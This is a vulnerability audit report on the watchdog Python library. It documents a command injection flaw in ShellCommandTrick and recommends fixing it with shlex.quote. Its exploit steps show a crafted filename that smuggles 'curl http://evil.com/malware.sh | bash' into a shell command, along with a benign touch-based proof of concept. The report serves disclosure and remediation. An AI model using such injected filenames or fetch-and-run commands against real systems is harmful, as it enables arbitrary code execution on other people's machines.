# Security Vulnerability Audit Report
## Watchdog Python Library

**Audit Date:** 2025-11-20
**Auditor:** Senior Security Researcher and Code Auditor
**Scope:** All Python files in the watchdog repository
**Methodology:** Manual code review with focus on CVE-eligible vulnerabilities

---

## Executive Summary

A comprehensive security audit was performed on all Python files in the watchdog repository. The audit focused on identifying security vulnerabilities eligible for CVE assignment, with high confidence requirements and strict filtering to minimize false positives.

**Total Vulnerabilities Found:** 1
**Severity:** HIGH

---

## Vulnerability Findings

### [1] Command Injection via Filename in ShellCommandTrick

**File & Line Number:** `src/watchdog/tricks/__init__.py:130-131`

**CWE ID:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

**Confidence Score:** 7/10

**Vulnerability Description:**

The `ShellCommandTrick` class executes shell commands in response to filesystem events. File paths from filesystem events (including `src_path` and `dest_path`) are substituted into user-provided command templates using Python's `string.Template.safe_substitute()` method, then executed via `subprocess.Popen(command, shell=True)`.

The vulnerability occurs because `safe_substitute()` performs simple variable interpolation without any shell escaping. When a file is created with a malicious filename containing shell metacharacters, these characters are not escaped and are interpreted by the shell, allowing arbitrary command execution.

**Untrusted Input Source:**

Filesystem event paths (`event.src_path`, `event.dest_path`) which correspond to filenames created by any user or process with write access to the monitored directory. Examples include:
- Files in world-writable directories (e.g., `/tmp`)
- Files in shared network folders
- Files in upload directories
- Files in any directory where untrusted users have write access

**Exploit Logic:**

1. Victim user runs watchmedo with shell-command feature:
   ```bash
   watchmedo shell-command --command='echo "${watch_src_path}"' --recursive /tmp
   ```

2. Attacker creates a file with a malicious name in the monitored directory:
   ```bash
   touch '/tmp/innocent.txt"; curl http://evil.com/malware.sh | bash; echo "'
   ```

3. Watchdog detects the file creation event and calls `ShellCommandTrick.on_any_event()`

4. The file path is stored in the context dictionary:
   ```python
   context = {
       "watch_src_path": '/tmp/innocent.txt"; curl http://evil.com/malware.sh | bash; echo "',
       ...
   }
   ```

5. Template substitution occurs without shell escaping:
   ```python
   command = Template('echo "${watch_src_path}"').safe_substitute(**context)
   # Result: 'echo "/tmp/innocent.txt"; curl http://evil.com/malware.sh | bash; echo ""'
   ```

6. The command is executed with shell=True:
   ```python
   subprocess.Popen(command, shell=True)
   ```

7. The shell interprets this as three separate commands:
   - `echo "/tmp/innocent.txt"` (harmless)
   - `curl http://evil.com/malware.sh | bash` (malicious payload)
   - `echo ""` (harmless)

8. Attacker achieves arbitrary command execution in the context of the watchmedo process

**Why this is a CVE:**

1. **Security Boundary Violation:** This vulnerability allows untrusted input (filenames) to cross a security boundary and execute arbitrary commands. The attacker only needs the ability to create files with specific names in a monitored directory.

2. **Privilege Escalation:** If watchmedo is running with elevated privileges (e.g., monitoring system directories as root), the attacker's commands execute with those same privileges.

3. **High Severity Impact:** Successful exploitation grants the attacker arbitrary code execution, allowing them to:
   - Steal sensitive data
   - Modify or delete files
   - Install backdoors or malware
   - Pivot to other systems
   - Create persistent access

4. **Common Attack Vector:** Many legitimate use cases involve monitoring directories that may contain untrusted files:
   - Web application upload directories
   - Shared team folders
   - Temporary directories
   - Network-mounted filesystems
   - CI/CD build directories processing external code

**Not a Feature Because:**

1. **No Security Documentation:** The README and documentation show examples of the shell-command feature but provide no warnings about the security implications of monitoring untrusted directories. Users are not informed that file names can inject shell commands.

2. **Violates Principle of Least Surprise:** While users expect the tool to execute shell commands (that's the feature's purpose), they do not reasonably expect that the *names* of files being monitored can break out of command templates and inject arbitrary code. This is analogous to SQL injection - users provide a query template but don't expect data to be able to break out of it.

3. **No Escaping Mechanism:** The implementation provides no way for users to safely use this feature with untrusted directories. There's no option for shell escaping, no security warnings, and no safe mode.

4. **Function Name Doesn't Indicate Risk:** While "shell-command" indicates the execution of shell commands, it doesn't indicate that filesystem paths (the data being monitored) will be treated as executable code rather than data.

5. **Can Be Fixed Without Breaking Functionality:** The vulnerability can be remediated by properly escaping file paths before substitution (e.g., using `shlex.quote()`), which would maintain all intended functionality while preventing injection attacks.

6. **Similar Vulnerability Class:** This is a standard command injection vulnerability, similar to SQL injection, path traversal, etc. The feature is "execute commands on file events," not "allow file names to inject arbitrary commands."

**Proof of Concept:**

```bash
# Terminal 1: Start watchmedo monitoring /tmp
watchmedo shell-command \
    --command='echo "File detected: ${watch_src_path}"' \
    --recursive \
    /tmp

# Terminal 2: Create malicious file
touch '/tmp/test"; touch /tmp/pwned; echo "'

# Result: /tmp/pwned is created, demonstrating command execution
```

**Recommended Mitigation:**

Apply proper shell escaping to all variables before template substitution:

```python
import shlex
from string import Template

# Escape all paths before substitution
context = {
    "watch_src_path": shlex.quote(event.src_path),
    "watch_dest_path": shlex.quote(event.dest_path) if hasattr(event, "dest_path") else "",
    "watch_event_type": event.event_type,
    "watch_object": object_type,
}

command = Template(command).safe_substitute(**context)
self.process = subprocess.Popen(command, shell=True)
```

Alternatively, the documentation should include prominent security warnings about monitoring untrusted directories.

**CVSS Score Estimate:** 8.4 (HIGH)
- Attack Vector: Local
- Attack Complexity: Low
- Privileges Required: Low (write access to monitored directory)
- User Interaction: None (after watchmedo is started)
- Scope: Unchanged
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

---

## Files Reviewed

The following files were reviewed during this audit:

**Core Modules:**
- src/watchdog/__init__.py
- src/watchdog/events.py
- src/watchdog/watchmedo.py ⚠️
- src/watchdog/version.py

**Tricks Module:**
- src/watchdog/tricks/__init__.py ⚠️ (VULNERABILITY FOUND)

**Observer Implementations:**
- src/watchdog/observers/__init__.py
- src/watchdog/observers/api.py
- src/watchdog/observers/fsevents.py
- src/watchdog/observers/fsevents2.py
- src/watchdog/observers/inotify.py
- src/watchdog/observers/inotify_c.py
- src/watchdog/observers/inotify_move_event_grouper.py
- src/watchdog/observers/kqueue.py
- src/watchdog/observers/polling.py
- src/watchdog/observers/read_directory_changes.py
- src/watchdog/observers/winapi.py

**Utility Modules:**
- src/watchdog/utils/__init__.py
- src/watchdog/utils/backwards_compat.py
- src/watchdog/utils/bricks.py
- src/watchdog/utils/delayed_queue.py
- src/watchdog/utils/dirsnapshot.py
- src/watchdog/utils/echo.py
- src/watchdog/utils/event_debouncer.py
- src/watchdog/utils/patterns.py
- src/watchdog/utils/platform.py
- src/watchdog/utils/process_watcher.py

**Documentation and Examples:**
- docs/source/conf.py
- docs/source/examples/*.py

**Test Files:**
- tests/*.py (test code reviewed but not included in security scope)

---

## Issues Considered But Not Reported

The following potential issues were identified but did not meet the criteria for CVE-worthy vulnerabilities:

### 1. Dynamic Class Loading via YAML Tricks Files

**Location:** `src/watchdog/watchmedo.py:211`

**Why Not Reported:**
- The tricks YAML file path is specified by the user running watchmedo via command-line arguments
- The user has full control over which tricks file to load
- This is by design - the feature explicitly allows loading custom trick classes
- No security boundary is crossed (user controls both the tricks file and the execution)
- Similar to running a Python script - if you control the file, you control the execution
- **Confidence Score: 2/10** - This is intended functionality, not a vulnerability

### 2. os.system() Usage in Test Code

**Location:** `tests/shell.py:105, 109`

**Why Not Reported:**
- These are test utilities, not production code
- Not exposed to end users
- Not part of the installed package
- Test code is expected to have privileged operations
- **Confidence Score: 1/10** - Test code, not a production vulnerability

---

## Methodology Notes

**Pre-Screening Applied:**

For each potential issue, the following questions were evaluated:

1. ✅ **Is this a designed feature?** - Checked against README, documentation, and examples
2. ✅ **Is there a trust boundary violation?** - Identified if untrusted input reaches privileged operations
3. ✅ **Who is the attacker?** - Identified the source of malicious input
4. ✅ **Is security externalized?** - Checked if README mentions sandboxing/containers/runtime security

**Filtering Criteria Applied:**

- ✅ High confidence only - no theoretical vulnerabilities
- ✅ CVE-worthy severity (Medium/High/Critical)
- ✅ Must demonstrate clear untrusted input source
- ✅ Must show security boundary crossing
- ✅ Must have clear exploit logic

---

## Conclusion

The watchdog library contains one high-severity command injection vulnerability in the `ShellCommandTrick` class. This vulnerability allows attackers with the ability to create files in monitored directories to execute arbitrary commands in the context of the watchmedo process.

**Recommended Actions:**

1. **Immediate:** Add security warnings to documentation about monitoring untrusted directories
2. **Short-term:** Apply shell escaping to all file paths before template substitution
3. **Long-term:** Consider deprecating `shell=True` in favor of safer command execution methods

**Impact Assessment:**

This vulnerability poses a significant risk in environments where:
- Watchmedo monitors directories with untrusted file writes
- Watchmedo runs with elevated privileges
- Multiple users share access to monitored directories
- External data (uploads, downloads, external repos) is monitored

---

**Audit Completion:** All Python files have been reviewed. No additional CVE-eligible vulnerabilities were identified with high confidence.
